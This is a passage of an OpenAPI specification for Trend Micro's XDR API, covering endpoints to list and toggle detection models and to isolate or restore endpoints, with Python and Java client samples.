            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/oat/detections\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"start\", \"YOUR_START (integer)\")\n                .addParameter(\"end\", \"YOUR_END (integer)\")\n                .addParameter(\"ingestStart\", \"YOUR_INGESTSTART (integer)\")\n                .addParameter(\"ingestEnd\", \"YOUR_INGESTEND (integer)\")\n                .addParameter(\"size\", \"YOUR_SIZE (integer)\")\n                .addParameter(\"riskLevels\", \"YOUR_RISKLEVELS (array)\")\n                .addParameter(\"endpointName\", \"YOUR_ENDPOINTNAME (string)\")\n                .addParameter(\"containerName\", \"YOUR_CONTAINERNAME (string)\")\n                .addParameter(\"tacticIds\", \"YOUR_TACTICIDS (array)\")\n                .addParameter(\"techniqueIds\", \"YOUR_TECHNIQUEIDS (array)\")\n                .addParameter(\"filterNames\", \"YOUR_FILTERNAMES (array)\")\n                .addParameter(\"nextBatchToken\", \"YOUR_NEXTBATCHTOKEN (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/dmm/models": {
      "get": {
        "summary": "List detection models",
        "description": "Retrieves a list of enabled and disabled detection models\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Detection Model Management</b><br>\n  <ul>\n    <li>View, filter, and search (Detection Models tab)</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "risk",
            "description": "filter by model severity, default will query all severities",
            "in": "query",
            "schema": {
              "type": "string",
              "example": "Critical",
              "enum": [
                "Critical",
                "High",
                "Medium",
                "Low"
              ]
            }
          },
          {
            "name": "product",
            "description": "filter by applicable products, default will query all products, to query multi-products, use comma to join the products\n  * `sao` - Apex One SaaS\n  * `pdi` - DDI\n  * `xes` - XDR Endpoint Sensor\n  * `sds` - Deep Security SaaS (C1WS)\n  * `pds` - Deep Security On-Prem\n  * `stp` - TippingPoint SaaS (C1NS)\n  * `sca` - Cloud App Security\n  * `asg` - Service Gateway App (Magic Box)\n  * `pdd` - DDD\n",
            "in": "query",
            "schema": {
              "type": "string",
              "example": "sao, xes",
              "enum": [
                "sao",
                "pdi",
                "xes",
                "sds",
                "pds",
                "stp",
                "sca",
                "asg",
                "pdd"
              ]
            }
          },
          {
            "name": "stat",
            "description": "filter by model status, default will query all status",
            "in": "query",
            "schema": {
              "type": "string",
              "example": "enable",
              "enum": [
                "enable",
                "disable"
              ]
            }
          },
          {
            "name": "lastupdate",
            "description": "filter by model lastupdate(days), default will query all models",
            "in": "query",
            "schema": {
              "type": "string",
              "example": 7,
              "enum": [
                7,
                30,
                90
              ]
            }
          },
          {
            "name": "filter",
            "description": "filter by model name or description, default will query all models",
            "in": "query",
            "schema": {
              "type": "string",
              "example": "suspicious"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "description": "detection models list",
                      "type": "array",
                      "items": {
                        "type": "object",
                        "properties": {
                          "modelId": {
                            "type": "string",
                            "example": "sae-02d024ae-47e2-407b-83bd-8db00c4be901"
                          },
                          "name": {
                            "type": "string",
                            "example": "Pass-The-Ticket Via Rubeus Tool"
                          },
                          "enabled": {
                            "type": "boolean",
                            "example": false
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Incorrect params"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "Information about the error",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "Error code",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "Error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "Information about the error",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "Error code",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "Error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Detection Models"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/dmm/models'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'risk': 'YOUR_RISK (string)',\n    'product': 'YOUR_PRODUCT (string)',\n    'stat': 'YOUR_STAT (string)',\n    'lastupdate': 'YOUR_LASTUPDATE (string)',\n    'filter': 'YOUR_FILTER (string)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/dmm/models\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"risk\", \"YOUR_RISK (string)\")\n                .addParameter(\"product\", \"YOUR_PRODUCT (string)\")\n                .addParameter(\"stat\", \"YOUR_STAT (string)\")\n                .addParameter(\"lastupdate\", \"YOUR_LASTUPDATE (string)\")\n                .addParameter(\"filter\", \"YOUR_FILTER (string)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/dmm/models/{modelId}": {
      "post": {
        "summary": "Enable or disable a detection model",
        "description": "Changes the status of the detection model to either allow or prevent the model from triggering alerts\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Detection Model Management</b><br>\n  <ul>\n    <li>View, filter, and search (Detection Models tab)</li>\n    <li>Enable/Disable models</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "modelId",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "example": "ti-0001"
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "enable"
                ],
                "properties": {
                  "enable": {
                    "description": "model status",
                    "type": "boolean",
                    "example": true
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "data"
                  ],
                  "properties": {
                    "data": {
                      "type": "object",
                      "properties": {
                        "enable": {
                          "type": "boolean"
                        }
                      },
                      "example": {
                        "enable": true
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "Bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Incorrect params"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "Information about the error",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "Error code",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "Error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "Information about the error",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "Error code",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "Error message",
                          "example": "DB error."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Detection Models"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/dmm/models/{modelId}'\nurl_path = url_path.format(**{'modelId': 'YOUR_MODELID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'enable': 'YOUR_ENABLE (boolean)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/dmm/models/{modelId}\";\n        urlPath = urlPath.replace(\"{modelId}\", \"YOUR_MODELID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"enable\\\": \\\"YOUR_ENABLE (boolean)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/isolate": {
      "post": {
        "summary": "Isolate endpoint",
        "description": "Disconnects an endpoint from the network (but allows communication with the managing Trend Micro server product)\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Isolate endpoint</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "computerId",
                  "productId"
                ],
                "properties": {
                  "computerId": {
                    "description": "endpoint id",
                    "type": "string",
                    "example": "cb9c8412-1f64-4fa0-a36b-76bf41a07ede"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sao",
                    "enum": [
                      "sao",
                      "sds"
                    ],
                    "default": "sao"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "isolate endpoint info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Endpoint"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/isolate'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'computerId': 'YOUR_COMPUTERID (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/isolate\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"computerId\\\": \\\"YOUR_COMPUTERID (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/restoreIsolate": {
      "post": {
        "summary": "Restore endpoint connection",
        "description": "Restores network connectivity to an endpoint that applied the \"Isolate endpoint\" action\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Isolate endpoint</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "computerId",
                  "productId"
                ],
                "properties": {
                  "computerId": {
                    "description": "isolated endpoint id",
                    "type": "string",
                    "example": "cb9c8412-1f64-4fa0-a36b-76bf41a07ede"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sao",
                    "enum": [
                      "sao",
                      "sds"
                    ],
                    "default": "sao"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "retore isolated endpoint info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "Not Found",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Not Found",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Endpoint"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
